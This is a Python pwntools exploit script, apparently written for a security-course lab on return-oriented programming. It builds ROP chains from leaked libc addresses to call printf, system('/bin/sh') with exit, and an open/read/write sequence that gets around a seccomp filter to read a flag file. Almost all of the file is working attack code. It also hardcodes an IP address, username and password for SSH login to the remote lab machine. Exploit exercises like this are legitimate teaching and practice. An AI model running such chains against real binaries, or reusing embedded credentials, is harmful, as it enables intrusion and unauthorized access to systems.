#!/usr/bin/env python2

import os
import re
import sys

from pwn import *

context.arch = "x86"
context.bits = 32
debug = False
exe = "./target-seccomp"
l = '/lib/i386-linux-gnu/libc-2.27.so'

ip = '52.201.10.159'
user = 'lab06'
myPassword = '27b69684'
p = process(exe)


if args['JAKE']:
    debug = True

if args['REMOTE']:
    s = ssh(user, ip, password=myPassword)
    p = s.process(exe, cwd='/home/lab06/tut06-rop')

def writeToFile(payload):
    # Write shellcode to a binary
    f = open('shellcode', 'w')
    f.write(payload)
    f.close()

def exec_fmt(payload):
    p = process(exe)
    p.sendline(payload)
    return p.recvall()

def getOffset():
    return FmtStr(exec_fmt).offset

def getLeak(leak):
    return int(leak[12:20], 16)

# Find our addresses
target_binary = ELF(exe)
libc_binary = ELF(l)
assert(libc_binary != None)

# Get the leaked addresses
stack_leak = getLeak(p.recvline())
system_leak = getLeak(p.recvline())
printf_leak = getLeak(p.recvline())
base = system_leak - libc_binary.symbols['system']
myBase = base

# 0x08048479: pop ebx; ret;
# 0x0804885a: pop edi; pop ebp; ret;
pop1 = 0x080485b5
pop2 = 0x08048b2a
pop3 = 0x08048b29
pop4 = 0x08048b28

padding = 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa'

def payload1(padding):
    '''
    [buf  ]
    [.....]
    [ra   ] -> printf()
    [dummy]
    [arg1 ] -> "Password OK :)"
    '''
    ra = libc_binary.symbols['printf'] + base
    dummy = 0xdeadbeef
    arg1 = 0x8049b79 # Password OK :)
    return padding + p32(ra) + p32(dummy) + p32(arg1)
    
def payload2(padding):
    # Note that this calls for system for seccomp doesn't let you run 
    # system. Just using printf as POC.
    '''
    [buf  ]
    [.....]
    [ra   ] -> system()
    [dummy]
    [arg1 ] -> "/bin/sh"
    '''
    binShOffset = 0xf7f370cf - 0xf7e0a2d0
    printf = libc_binary.symbols['printf']
    ra = libc_binary.symbols['printf'] + base
    dummy = 0xdeadbeef
    arg1 = binShOffset + printf_leak
    return padding + p32(ra) + p32(dummy) + p32(arg1)
    
def payload3(padding):
    '''
    [buf      ]
    [.....    ]
    [old-ra   ] -> 1) system
    [ra       ] -----------------> pop/ret
    [old-arg1 ] -> 1) "/bin/sh"
    [ra       ] -> 2) exit
    [dummy    ]
    [arg1     ] -> 0
    '''
    binShOffset = 0xf7f370cf - 0xf7e0a2d0
    printf = libc_binary.symbols['printf']
    ra1 = libc_binary.symbols['printf'] + base
    dummy = 0xdeadbeef
    arg1_1 = binShOffset + printf_leak
    ra2 = libc_binary.symbols['exit'] + base
    arg1_2 = 0
    return padding + p32(ra1) + p32(pop1) + p32(arg1_1) + p32(ra2) + p32(dummy) + p32(arg1_2)

def payload4(padding):
    '''
    [buf      ]
    [.....    ]
    [ra       ] -> 1) open
    [pop2     ] --------------------> pop/pop/ret
    [arg1     ] -> "/proc/flag"
    [arg2     ] -> 0 (O_RDONLY)
    [ra       ] -> 2) read
    [pop3     ] ------------------> pop/pop/pop/ret
    [arg1     ] -> 3 (new fd)
    [arg2     ] -> tmp
    [arg3     ] -> 1040
    [ra       ] -> 3) write
    [dummy    ]
    [arg1     ] -> 1 (stdout)
    [arg2     ] -> tmp
    [arg3     ] -> 1040
    '''

    # The garbage to fill the buffer
    dummy = 0xdeadbeef
    flag = "password"
    tmp = 0x804a000

    buf = 'A' * (len(padding)-1)
    buf = buf + "\n"
    ra_0 = libc_binary.symbols['open'] + base
    ra_1 = libc_binary.symbols['read'] + base
    ra_2 = libc_binary.symbols['write'] + base

    #stack_offset = stack_leak - 0xffffd324
    #print "%d" % stack_offset
    stackDiff = 0x20 # (stack_leak - 0xffffd300)
    arg1_0 = stack_leak + stackDiff - 0x16
    arg1_0 = 0x8049b68
    arg2_0 = 0

    arg1_1 = 3
    arg2_1 = tmp
    arg3_1 = 1040

    arg1_2 = 1
    arg2_2 = tmp
    arg3_2 = 1040

    func0 = p32(ra_0) + p32(pop2)  + p32(arg1_0) + p32(arg2_0)
    func1 = p32(ra_1) + p32(pop3)  + p32(arg1_1) + p32(arg2_1) + p32(arg3_1)
    func2 = p32(ra_2) + p32(dummy) + p32(arg1_2) + p32(arg2_2) + p32(arg3_2)

    # Create payload
    return (buf + func0 + func1 + func2)


def getAddrOfString(e, string):
    for address in e.search(string):
        addr = int(hex(address), 16)
        print addr
    assert(addr != None)
    return addr

def payload4_seccomp(padding):
    '''
    [buf      ]
    [.....    ]
    [ra       ] -> 1) open
    [pop2     ] --------------------> pop/pop/ret
    [arg1     ] -> "/proc/flag"
    [arg2     ] -> 0 (O_RDONLY)
    [ra       ] -> 2) read
    [pop3     ] ------------------> pop/pop/pop/ret
    [arg1     ] -> 3 (new fd)
    [arg2     ] -> tmp
    [arg3     ] -> 1040
    [ra       ] -> 3) write
    [dummy    ]
    [arg1     ] -> 1 (stdout)
    [arg2     ] -> tmp
    [arg3     ] -> 1040
    '''

    dummy = 0xdeadbeef
    flag = "password"
    tmp = 0x804a000

    fileName  = getAddrOfString(target_binary, 'Password:')
    rop = ROP(target_binary, base=myBase)
    # Create payload
    rop.raw(libc_binary.symbols['open'] + base)
    rop.raw(pop2)
    rop.raw(fileName)
    rop.raw(0)
    
    rop.raw(libc_binary.symbols['read'] + base)
    rop.raw(pop3)
    rop.raw(3)
    rop.raw(tmp)
    rop.raw(1040)
    
    rop.raw(libc_binary.symbols['write'] + base)
    rop.raw(pop3)
    rop.raw(1)
    rop.raw(tmp)
    rop.raw(1040)
    

    print rop.dump()
    return padding + rop.chain()


payload = payload4_seccomp(padding)
log.success('Payload %s\n', payload)
writeToFile(payload)

if debug == True:
    script = '''
    b main
    r < <(cat shellcode)
    '''.format(payload)
    print script
    gdb.attach(p, script)
else:
    p.sendline(payload)
    p.interactive()
    print p.recvall()
